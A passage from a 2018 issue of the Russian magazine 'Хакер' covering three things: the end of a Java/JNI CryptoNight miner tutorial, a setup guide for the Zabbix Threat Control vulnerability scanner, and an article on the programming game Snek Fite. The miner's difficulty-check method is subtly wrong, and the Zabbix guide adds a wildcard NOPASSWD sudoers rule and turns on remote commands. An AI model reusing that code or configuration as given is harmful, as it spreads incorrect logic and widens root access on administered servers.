утилит, которые можно запускать под вин дой. При установке нужно выбрать
пакеты mingw64‐x86_64‐gcc‐core и mingw64‐x86_64‐gcc‐g++.





                          Ус тановка Cygwin

Для загрузки библиотеки соз дадим класс CryptoNight в пакете com.goga‐
worm.electroneumminer.


public class Cryptonight {
  // Загружаем библиотеку с именем minerhashing, расширение писать
не нужно
  static {
    System.loadLibrary("minerhashing");
  }
  // Метод расчета хеша из библиотеки
  public native static void calculateHash(byte[] output, byte[] input
);
}

Метод calculateHash объявлен как native, это означает, что он реализован
на другом языке. Далее нужно сгенерировать файл заголовка:


> %JAVA_HOME%\bin\javah.exe ‐jni ‐v ‐d com/gogaworm/electroneumminer
com.gogaworm.electroneumminer.Cryptonight

Мы   получим   файл   com_gogaworm_electroneumminer_Cryptonight.h
с  методом   Java_com_gogaworm_electroneumminer_Cryptonight_hash,
который нужно реализовать на С. Для этого создадим файл с таким же име‐
нем, но расширением .c. Оба файла нужно перенести в папку с исходниками
libcryptonight.


// Обязательно нужно включить файл — заголовок для jni. Он находится
в папке с установленной Java
#include <jni.h>
JNIEXPORT void JNICALL Java_com_gogaworm_electroneumminer_Crypton
ight_calculateHash (JNIEnv *env, jclass clazz, jbyteArray output,
jbyteArray input) {
  // Копируем массивы данных в новую область памяти. Работать с
массивами напрямую в JavaHeap нельзя, так как сборщик мусора может
перемещать их в памяти
  unsigned char* inputBuffer = (*env)‐>GetByteArrayElements(env,
input, NULL);
  unsigned char* outputBuffer = (*env)‐>GetByteArrayElements(env,
output, NULL);
  // Определяем размеры массивов
  jsize inputSize = (*env)‐>GetArrayLength(env, input);
  jsize outputSize = (*env)‐>GetArrayLength(env, output);
  // Рассчитываем хеш
  cryptonight_hash(outputBuffer, inputBuffer, inputSize);
  // Освобождаем область памяти, использованную для массивов
  (*env)‐>ReleaseByteArrayElements(env, input, inputBuffer, JNI_ABORT
);
  (*env)‐>ReleaseByteArrayElements(env, output, outputBuffer, JNI_CO
MMIT);
}

Теперь запускаем Cygwin‐консоль и собира ем DLL:


> x86_64‐w64‐mingw32‐gcc ‐I"$JAVA_HOME/include" ‐I"$JAVA_HOME/
include/win32" ‐shared ‐o minerhashing.dll ‐g com_gogaworm_el
ectroneumminer_Cryptonight.c cryptonight.c crypto/aesb.c crypto/
c_blake256.c crypto/c_groestl.c crypto/c_jh.c crypto/c_keccak.c
crypto/c_skein.c crypto/oaes_lib.c

Чтобы наш майнер увидел библиотеку, необ ходимо определить системную
переменную Java java.library.path=<путь к библиотеке>.
  Проверим, что библиотека работа ет пра вильно. В документе, описыва‐
ющем алгоритм CryptoNight, есть два при мера для проверки. Запустим один
из них:


@Test
public void testHashMethod() throws UnsupportedEncodingException {
  byte[] outputBuffer = new byte[32];
  byte[] input = hexStringToByteArray(block);
  Cryptonight.calculateHash(outputBuffer, "This is a test".getBytes(
"US‐ASCII"));
  assertEquals("a084f01d1437a09c6985401b60d43554ae105802c5f5d8a9b32
53649c0be6605", bytesToHex(outputBuffer).toLowerCase());
}

Остался метод проверки, найдено ли нуж ное зна чение. Команда get_block‐
_template вернула в результате параметр diﬃculty. Этот параметр показы‐
вает условный коэф фициент слож ности нахождения нужного хеша. По спе‐
                          265цификации сложность = (2    ‐ 1) / целевое зна чение (target). Для этой фор‐
мулы хеш блока нужно перевес ти из больших индейцев в мел кие. Затем срав‐
ним с текущей сложностью, что бы понять, найдено ли нужное значение:


public static boolean hasRequiredDifficulty(byte[] hash, BigInteger
difficulty) {
  BigInteger diff1 = new BigInteger("FFFFFFFFFFFFFFFFFFFFFFFF
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", 16);
  BigInteger reversed = new BigInteger(bytesToHex(Arrays.reverse(hash
)), 16);
  BigInteger hashdiff = diff1.divide(difficulty);
  if (hashdiff.compareTo(difficulty) >= 0) {
    return true;
  }
  return false;
}

Чтобы проверить, верно ли работает метод, испы таем его на уже готовом
блоке из сети. Получить его можно командой  getblock. Возьмем блок
с высотой 338 401. Его хеш равен


13b3cf8b04b6bb78f0c7c1a50f7e8656963c1f48a56ba89999eddf0531750b15

а сложность — 252087628780. В результате вычислений получаем, что hashd‐
iﬀ больше diﬃculty.
   Когда найдено нужное зна чение nonce, можно отправлять блок в сеть.
Это делает коман да


{
  "jsonrpc":"2.0",
  "id":"0",
  "method":"submitblock",
  "params":{
    "Block ":"blob template с нужным nonce"
  }
}

Осталось перенести методы работы с сервером и майнинга в отдельные
потоки, и простой майнер готов.


ВМЕСТО ЗАКЛЮЧЕНИЯ
Как заявляют разработчики криптовалю ты Electroneum, ее можно майнить
даже на смартфонах. Приложение для майнинга уже лежит в Google Play.
Но на самом деле там только симуляция майнинга: вместо того чтобы решать
сложную криптографическую задачу, измеряют доступную производитель‐
ность CPU, которую теоретичес ки можно было бы использовать для май нин‐
га, и на основе этого значения начисляется заработок. Поэтому майнер
для Андроида будет выглядеть нес колько ина че.
  Но это уже совсем другая история.
АДМИН
 УГРОЗЫ
 ПОД КОНТРОЛЕМ
     ПРЕВРАЩАЕМ ZABBIX В СКАНЕР
          БЕЗОПАСНОСТИ





15 июня 2018 года ребята из Vulners пред‐
ставили опенсорсный про ект Zabbix Threat
Control, позволяющий превратить систему
мониторинга  Zabbix в систему кон троля
безопасности машин. В этой статье мы         Роман Вегелин                                                                                                   vegelin47@mail.ru
расскажем, что такое Zabbix Threat Control,
покажем, как его установить, и про верим
работоспособность системы.


ЧТО ТАКОЕ ZABBIX
Zabbix — одна из самых популярных систем мониторинга. Она состоит из двух
компонентов: zabbix‐сер вера и zabbix‐агентов. Агенты собирают информа‐
цию с операционных систем, на которых установлены, и отправляют ее
на сервер. Он же, в свою очередь, выдает ее адми нам в читабельном виде
либо  отправляет алармы на  почту.  Чтобы подытожить и  дать  понять
обширность фун кциональнос ти, скажу, что оповещения о сбоях можно при‐
нимать даже в Telegram.


ЧТО ТАКОЕ VULNERS
Vulners — своего рода поисковик на тему ИБ. Он черпает информацию
из более чем 100 различных баз и источни ков. В нем можно най ти уязвимос‐
ти, баги, экспло иты, дырявые сервисы, плагины для OpenVAS, NESSUS, Burp
Suite, правила для IPS/IDS и мно гое дру гое. Хорошая сортировка выдачи
результатов и отличный API. В общем, если кто‐то не знаком, — обязательно
надо. Незаменимый инструмент хакера и ИБ‐шни ка.


ZABBIX THREAT CONTROL
Zabbix Threat Control — плагин, который поз воляет превратить систему
мониторинга Zabbix в сканер безопас ности с участием сис темы Vulners. Пос‐
ле установки необ ходимых пакетов и сбора информа ции он покажет все сер‐
веры в сети, которые подвержены тем или иным уязвимостям из‐за неус‐
тановленных патчей или старых версий пакетов. Другими словами, основная
задача Zabbix Threat Control — это контроль версионных уязвимос тей. Он
не сможет проверить нас тройки конфигурационных файлов или пре дупредить
об ошибке в коде.
  Работает все это следующим образом. Zabbix с помощью агентов собира‐
ет с машин информацию о названии и вер сии ОС, формирует список уста‐
новленных пакетов и их версий, а затем отда ет это все ZTC. Плагин, получив
всю информацию, пересылает ее в Vulners. Последний сопоставляет все дан‐
ные с базой уязвимостей и багов и воз вра щает результат в Zabbix Threat Con‐
trol. Информация обрабатывается, отправляется Zabbix‐серверу, пос ле чего
конечный пользователь может ознакомиться в дашборде со списком уяз‐
вимостей на машинах.
  Информация об уязвимос тях выводится в виде проблем. Проблему можно
либо игнорировать (прос то закрыв ее, не подтверждая), и никакого действия
не последует, либо подтвердить, пос ле чего агентам отправится ﬁx‐команда,
которая устранит уязвимость. Фиксить проблемы может только привилегиро‐
ванный пользователь. Какая команда будет выполнена и на каких серверах,
можно будет увидеть в дашборде.
  На  данный  момент  Zabbix  Threat  Control  требует  Zabbix  версии
не ниже 3.4 и способен работать только с Linux, но, возможно, будут раз‐
работаны пакеты под другие ОС (в том числе активное сетевое оборудо‐
вание).


УСТАНАВЛИВАЕМ
Рассмотрю установку на Debian. Она проходит в несколько этапов:
 1. Установка сервера Zabbix и агентов на отслеживаемые хосты.
 2. Установка плагинов ZTC на отслежива емые хосты и их нас тройка.
 3. Установка ZTC на сервер.


Сервер Zabbix
Для начала устанавлива ем сервер и клиент MySQL (можешь с этим не сог‐
ласиться, но до 20–25 серверов можно пос тавить MySQL, если больше —
лучше установить PostgreSQL):


$ sudo apt install mysql‐server mysql‐client

Добавляем репозитории:


$ wget http://repo.zabbix.com/zabbix/3.4/debian/pool/main/z/
zabbix‐release/zabbix‐release_3.4‐1+stretch_all.deb
$ sudo dpkg ‐i zabbix‐release_3.4‐1+stretch_all.deb
$ sudo apt update

И устанавливаем сервер Zabbix:


$ sudo apt install zabbix‐server‐mysql zabbix‐frontend‐php
zabbix‐agent

Подключаемся к MySQL:


$ mysql ‐uroot –pPass

Дальше необходимо создать базу данных и поль зователя (пароль устанав‐
ливаем свой):


create database zabbix character set utf8 collate utf8_bin;
grant all privileges on zabbix.* to zabbix@localhost identified by
'PASSWORD';
quit;

Добавляем таблицы в базу:


$ zcat /usr/share/doc/zabbix‐server‐mysql*/create.sql.gz | mysql
‐uzabbix ‐p zabbix

Открываем  в  редакторе  конфигурационный  файл  /etc/zabbix/zab‐
bix_server.conf и в нем прописываем значение DBPassword (пароль к базе
данных, указанный при ее соз дании). В том же каталоге, в файле apache.
conf следует указать параметр date.timezone (к при меру, Europe/Moscow).
  Делаем ссылку:


$ sudo ln ‐s /usr/share/zabbix/ /var/www/html/

На  этом  установка  Zabbix  окончена.  Перегружаем  сервис,  заходим
в веб‐интерфейс http://SERVER/zabbix и следуем простым подсказкам.
Дефолтный логин/пароль для входа — Admin/zabbix.


Аген ты
Чтобы установить Zabbix‐агенты на отлеживаемые хосты, достаточно инстал‐
лировать пакет zabbix‐agent (он будет запущен автоматически):


$ sudo apt install zabbix‐agent

Далее открываем конфигурационный файл /etc/zabbix/zabbix_agentd.
conf и добавляем в него следующие строки (адрес и имя сервера):


Server=192.168.1.1
ServerActive=192.168.1.1
Hostname=srv10

Перезапускаем агент:


$ service zabbix‐agent restart


Плагины ZTC
Для установки плагинов на хос ты необ ходимо добавить репозитории ZTC.
Это делается следующим обра зом:


$ wget https://repo.vulners.com/debian/vulners‐repo.deb
$ sudo dpkg ‐i vulners‐repo.deb

Затем устанавливаем плагин:


$ sudo apt‐get update
$ sudo apt‐get install zabbix‐threat‐control‐host

Далее идем в файл /etc/zabbix/zabbix_agentd.conf и меняем следующие
значения:


EnableRemoteCommands=1
LogRemoteCommands=1

Для того чтобы пользователь Zabbix смог обновлять (и только обновлять)
пакеты, необходимо добавить следующую строку в файл /etc/sudoers:


zabbix ALL=(ALL) NOPASSWD: /usr/bin/apt‐get ‐‐assume‐yes install
‐‐only‐upgrade *

Не забываем установить плагин также на сервер. После внесенных изме‐
нений агент необходимо переза пустить:


$ service zabbix‐agent restart


Сервер ZTC
Возвращаемся на сервер Zabbix. Как и в слу чае с агентами, добавляем
репозитории ZTC:


$ wget https://repo.vulners.com/debian/vulners‐repo.deb
$ sudo dpkg ‐i vulners‐repo.deb

После этого:


$ sudo apt‐get update
$ sudo apt‐get install zabbix‐threat‐control‐main
zabbix‐threat‐control‐host

Далее устанавливаем зависимос ти:


$ sudo apt install zabbix‐sender zabbix‐get python3 python3‐pip

На этом моменте стоит пояс нить, что в более ранних версиях плагины zabbix‐
sender и zabbix‐get поставлялись сразу с zabbix‐server, а сейчас их приходится
ставить отдельно. Продолжаем:


$ sudo pip3 install pyzabbix requests jpath

Теперь открываем браузер, идем на vulners.com и заводим учетную запись.
Заходим в аккаунт и на вкладке API KEYS генерируем ключ.
  Возвращаемся к серверу, открываем в редакторе файл /opt/monitor‐
ing/zabbix‐threat‐control/ztc_config.py:





Вносим свои данные. Необходимо указать логин и пароль пользователя Zab‐
bix, его адрес и fqdn. Если порт не дефол тный, его тоже меняем.
  После настрой ки конфигура ционного файла запускаем /opt/monitor‐
ing/zabbix‐threat‐control/ztc_create.py:





Скрипт создает необ ходимые хост‐группу, шаблон, экшен и свой дашборд.
В выводе будет указан URL дашборда ZTC и время, в которое будет запус‐
каться сканирование на уязвимос ти. Запустит сканирование исполне ние
скрипта  /opt/monitoring/zabbix‐threat‐control/ztc.py  (при  необ‐
ходимости можно запустить вручную).
  После проделанной работы открываем новый дашборд ZTC, переходим
в шаблоны и ищем там Vulners OS‐Report. В нем в разделе Hosts необходимо
указать, переместив их в левый textbox, те серверы, которые требуют ска‐
нирования. Ждем, пока программа сканиру ет хос ты, и получаем результаты.
Работает он очень быстро (1000 хостов ска нируется примерно за 30 минут).
  По окончании сканирования получа ем примерно такой вывод результатов:





На  диаграмме  красным  выделены  кри тичес кие  уязвимости, имеющие
высокую оценку CVSS. Все данные удобно отсортированы в нескольких
панелях: по уязвимым пакетам, по уязвимос тям и по серверам. Соответс‐
твенно, и исправить можно либо все уяз вимос ти на конкретно выбранном
сервере, либо определенную уяз вимость на всех серверах.
  Информацию по уязвимостям на серверах, как и о командах для устра‐
нения проблем, можно  получить  в подсказ ках,  которые  активируются
при наведении на проб лему. Там же будут представлены ссылки на vulners.‐
com, где можно ознакомиться с проблемами ИБ, касающимися данных сер‐
веров.





Для установки обновлений необходимо прос то подтвердить проблему. Осо‐
бенно удобно это будет для тех, кто хочет устра нить одну из уязвимостей
на всех серверах, если нет систем управления типа Ansible.


ЗАКЛЮЧЕНИЕ
Zabbix Threat Control не сможет заменить про фессиональные сис темы, пос‐
кольку не имеет таких богатых возможностей. Однако он быс трый, бесплат‐
ный и хорошо вписывается в существующую инфраструктуру.
   Стоит учитывать, что это лишь первый выпуск пла гина, поэтому не исклю‐
чены баги и недоработки. Однако в Telegram есть группа @ztcsupport,
в которой можно получить поддержку и обратную связь.
GEEK



SNEK FITE
            КАК Я СДЕЛАЛ
      ОНЛАЙНОВУЮ ИГРУ
    ДЛЯ ПРОГРАММИСТОВ





           Михаил Кечинов
               noff@mkechinov.ru





Ты, конечно, знаешь такую замечательную игру, как «Змей‐
ка». Так вот, речь пойдет вовсе не о ней. Когда‐то давно я
нашел игру «Змеиные бои», которая позволяла программи‐
ровать змейку, а не управлять ей. Недавно я решился
не просто вос создать эту несправедливо забытую гамезу,
а  сделать  онлайновую  версию —  настоящую  арену
для робозмей!


«Змеиные бои» были выпущены в далеком 1992 году компанией Gamos.
Да‐да, той самой, которая потом подарит миру «Братьев‐пилотов» с памят‐
ным квестом про холодиль ник. Цель игры — остать ся самой длинной зме ей,
когда все ходы закончатся. Как это выг лядело, можешь посмотреть на видео.





Главной геймплейной фишкой было то, что ты не управлял своей змеей нап‐
рямую. Не нажимал на клавиши как уго релый. Потому что игра была (вне зап‐
но) про программирова ние.
   Это экран создания программной логики змеи. Есть девять слотов, в каж‐
дом ты можешь задать определенную ситуацию на поле боя. В твоем рас‐
поряжении есть объекты («голова», «тело», «хвост», «барьер», «пустое поле»)
и логические операторы, которые можно повесить на эти объекты («кроме»,
«или», «и»).





Ты мог заполнить все девять сло тов или только пару, а в зависимости от того,
что ты там накликал, твоя змея ста новилась или машиной для отгрызания
чужих хвостов, или чьей‐то едой.


С ЧЕГО ВСЕ НАЧИНАЛОСЬ
Вообще я не разработчик игр. И даже не раз работчик инди‐игр. В рабочие
часы  я  руковожу  проектами  в офисе  своей  питерской  IT‐компании,
еще менеджерю продукт про ecommerce. Иногда сам пишу код (потому что
могу!) и, конечно, люблю игры. На пересечении этих увлечений — разработка
игр, которой я пробовал заниматься еще в школьные годы.

Однажды, в далеких‑далеких девянос тых
Воспоминания о моем первом опыте игрос троения имеют мало отношения
к делу, но, мне кажется, это забавная история.
  В 1998 году после окончания шко лы я пос порил с одноклас сниками, что
смогу сделать игру от начала и до конца. Не имея собственного компьюте ра.
В то время в моде были тексто вые квесты, и я решил забабахать собственную
фэнтезийную адвенчуру с артефактом и гоб линами. Все лето ходил к другу,
сидел за его компьютером и фигачил на QBasic.
   Главной ошибкой было то, что я подошел к вопросу глобально и сделал
карту на две тысячи локаций. Каждая локация требовала текстового опи‐
сания — этот текст игрок читал, когда в нее переме щал ся. Моя фантазия
исчерпалась через пару сотен локаций. Даль ше в ход пошел Пришвин —
у него детальные описания природы.
  Пришвина хватило на две‐три сотни локаций. Поэтому для оставшихся
пришлось ограничиться лаконичными «Поле. Дорога уходит на запад и на
север» и подобными. Пари я почти выиграл — из‐за бага с репликами гоб‐
линов игра вылете ла во время демонс трации.



SNEK FITE
Долгое время я играл в бесплатную версию Snake Battle, купить в моем реги‐
оне платную было нереально (да никто в то время игры и не покупал, если
по‐честному). Когда в России ста ли популярны хакатоны, нес колько раз
пытался собрать команду и написать игру за 48 часов, но обычно команда
не собиралась. В конечном счете решил сделать все сам и заодно проверить
в действии книгу про customer development — соз дать прототип, найти
целевую аудиторию, понять, какие фичи реально нужны, а какие только кажут‐
ся важными.
  В мае 2018‐го выделил под это несколько часов и сваял первую версию.
Хотелось сде лать то, чего не удалось дос тичь ори гиналу в 1992 году, — нас‐
тоящий мультиплеер и турниры.
  В качестве платформы я выбрал бра узер как наиболее общедоступный
и прос той вариант. Бэкенд — Ruby on Rails и PostgreSQL. Первая версия была
готова часов за восемь. Она могла регистри ровать змей, программировать
их с помощью BPI (basic programming interface) и запускать бой на четыре
змеи.
   Игровое поле простое, как в оригина ле: стены и змеи, ничего лишнего.





Чтобы начать играть, соз даешь змею, придумы ваешь ей имя, тебе выдается
рептилия с уникальным цветом и узором на шкурке.





Потом настраиваешь логику поведения. Редактор почти такой же, с неболь‐
шими доработками. Например, можно заменять один объ ект на другой, прос‐
то помещая его поверх старого, — в оригинальной игре, насколько помню,
надо было как‐то по‐особому извра щать ся.





  Пример программы. Объекты на иллюстра ции рас ставлены методом
  священного рандома

Змея с такими паттернами, как на примере выше, бешено кру жит по перимет‐
ру, но если ей повезет наткнуть ся на вра жес кий хвост — начинает активно
гоняться за жер твой. В коллективных баталиях это иногда срабаты вает
хорошо: пока остальные разбираются друг с другом, змея бегает кругами
(почти гарантированно находясь в безопас ности). По закону жанра чужие
змеи в пылу битвы обязательно встают в блок и подставляют хвосты нашему
«стервятнику». На момент написа ния статьи змея занимает 30‐е место
в общем топе. Неплохо. Hack the system!
   Когда логика настроена, можно перехо дить на экран выбора игры. Сей час
пока есть три режима.
  Ду эль. Две змеи, 1000 ходов, побеж дает змея с наибольшим количес‐
твом секций на последнем ходу.





Стан дарт. Четыре змеи на одном большом поле. Тут час то решает нес‐
тандартное поведение — как в том примере, о котором я написал выше.





Правда, штука в том, что такая тактика будет сильно зависеть от режима игры.
То, что работает в «дуэли», в матче на девять игро ков вряд ли пройдет.
  Батл‑рояль. Deathmatch на девять змей на одной карте. Просто так
сюда не попасть, сначала нужно выбить «корону», играя в обычные матчи.





Онлайновая составляющая игры — это асин хронный мультиплеер. Все змеи
попадают в общую базу, и ты в любое время можешь сыграть хоть с кем —
со случайным оппо нентом или даже бро сить вызов кому‐то из лидеров (если
ты играл с ним раньше).





Функция реванша добавилась недавно, как и динамика (маленькие красные
и зеленые цифры рядом с мес том). Игра пос тоянно растет, стараюсь уделять
ей хотя бы по часу в день.
  Еще одна фишка — недавно сделал в игре «национальный рейтинг». Мож‐
но посмотреть, какая страна в топе. Правда, сейчас это почти полностью
зависит от количества игроков.





ЧТО ВНУТРИ
Сейчас все просто — игра сделана на упо мяну тых «рельсах». Что забавно,
уже сейчас, на 5000 боев, бэкап базы занимает 15 гигабайт. Отку да столько?
Записывается каждый ход каждого боя, и эти данные публичны — можно ана‐
лизировать и учить свою нейронную сеть. Да‐да, для особо упоротых в игре
есть и такая возможность, нужно только перейти на статус Pro.
  На дуэль или бой четырех змей уходит около 15 секунд. Королевская битва
считается дольше, с минуту. Но это только «альфа» — когда количество игро‐
ков вырастет, планирую прос то перенести все на отдельный сервер, и будет
работать быстрее.
  Сейчас на игру затрачено часов 80–100. Проект несложный, основное
время уходило либо на модуль рас чета боя, либо на BPI — я решил там
использовать Vue.JS, не имея никакого опыта работы с ним. Разобрался
в процессе.
  Баги? А как же.
  Самые сложные баги — змеи ходят не так, как должны были вести себя
при выполнении правил BPI. Спасибо, что есть активные игроки, которые
проводят десятки боев в день и сообщают о проблемах. В итоге при ходится
брать конкретный бой, конкретный раунд и ана лизи ровать, почему конкрет‐
ная змея пошла именно в этом направлении, а не в другом. Таким образом
удалось найти штук шесть серьезных багов. Например, раньше змеи бегали
зигзагами на пустом поле, сейчас так уже не быва ет.


ТАКТИКИ, ЧИТЫ, ПРОХОЖДЕНИЯ
Читы в этом подзаголовке, конечно, только для привлечения внимания и нос‐
тальгии ради (помнишь CheMax и ArtMoney?). А вот выигрышные тактики
в игре, конечно, есть.
  Один наш постоянный игрок под ником Zerro (в миру Станислав Ерохин)
проделал громадную работу — написал и проиллюстрировал собственное
руководство по воспитанию змеи‐чемпиона. Там есть базовые игровые
механики, FAQ, ретроспективы боев с выводами, выигрышные комбинации
и полезные ссылки.
   Весь труд цитировать смысла нет, он будет как десять таких статей. Так что
ограничимся несколькими быс трыми советами.


Со вет 1. Как избе жать «кры синых бегов»
В игре бывает, что две змеи начинают гоняться за хвостами друг друга.
Это тупик, если вы игра ете вдвоем. Если вас больше, то остается ждать, пока
кто‐нибудь сообразительный не подкра дется сза ди и не укоротит твою змею
наполовину (ну или не твою).





Автор предлагает использовать такой паттерн, чтобы вырваться из цикла,
но честно предупреждает — он бесполезен, когда твоя змея очень короткая.
Она просто слишком часто будет оказывать ся в подобном положении и не
сможет никому откусить хвост.





Мудрый вывод: забей. Пусть идут «крысиные бега»!


Со вет 2. Как сде лать защитную стойку
Стоило растянуться на солнышке, как из‐за куста появляется свора голодных
змей. Что делать? Можно задать такой паттерн, при котором твоя змея будет
сворачиваться в клубок при приближении опасности. Круто же?





Со вет 3. Как заставить змею иссле довать безопасную область
Автор предлагает считать за «безопасную область» две незанятые клетки
впереди и еще столько же сбо ку.





Змея будет ползти вперед, пока у нее на радарах не появится что‐то, кроме
пустых клеток.
  Надо сказать, что в игре автоматичес ки срабатывают и «зеркальные ситу‐
ации», то есть не надо дополнительно настра ивать отраженный по вертикали
паттерн или рисовать симметричный.
  В общем, это толь ко малая часть, рекомендую ознакомиться с полным
руководством, там есть над чем подумать. А вооб ще помни, что Snek Fite —
игра про экспе римен ты. Не бывает идеальной модели поведения (ну или она
есть, но ее пока ник то не вывел). Главное тут — не переставать ставить опыты
на своей рептилии, выпус кать в бой, корректировать поведение, снова выпус‐
кать.


Цените лям жан ра
Лю бителей программистских раз влечений, как ока залось, не так уж и мало.
У этих людей даже есть своя викия, там соб рано большое количество подоб‐
ных игр, выходивших с 1961 года. Всего — 60 штук. Называется ресурс Pro‐
gramming Games Wiki.
   Там, например, есть такая клас сика, как Omega (1989 год) и изначальный
отечественный Snake Battle.





                 Скриншот Omega (версия для DOS)

Впрочем, есть и более современные при меры — скажем, Human Resource
Machine (этакий экскурс в ассемблер, скрытый за игрой про смешных
человечков и конвейеры) и TIS‐100 — экскурс куда более серьезный. Кстати,
другие игры Zachtronics (хотя бы та же Shenzhen I/O) тоже могли бы занять
достойное место в спис ке.





            Скриншот из TIS‐100. Да, игры быва ют и такими!

И еще жаль, что боль шая часть ссылок уже не работает, а сами игрушки при‐
ходится выискивать на раз ных сайтах с ретроиграми.



ПЛАНЫ
Сейчас я хочу привести дизайн в порядок. Начал делать темную версию,
как принято в играх, но это реально требует вло жений времени. Дальше сде‐
лаю возможность выгрузки истории боев, а после этого займусь турнирами.
Это пока что самая сложная часть из запланированного, и для нее нужно мно‐
го активных игроков.
  Еще время от времени будут появляться раз личные рейтинги — благо
для этого все данные есть. Попоз же сделаю объединение в кланы и воз‐
можность биться два на два или тремя тройками.
  В общем, если стало интерес но, то приглашаю поиграть на snek.app,
а обратную связь кидать в Facebook.
    №07 (232)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Глав ный редактор       Выпускающий редактор         Шеф‐редак тор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипо ва
                                     Литературный редактор


                           РЕ ДАК ТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
                  aLLy              Ев гений Зобнин        Антон «ant» Жуков
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕК ЛАМА

                                  Анна Яков лева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по подписке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Друж бы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколам ское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязательно сов пада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редак ция
не несет ответственности за содер жание рекламных объ явлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018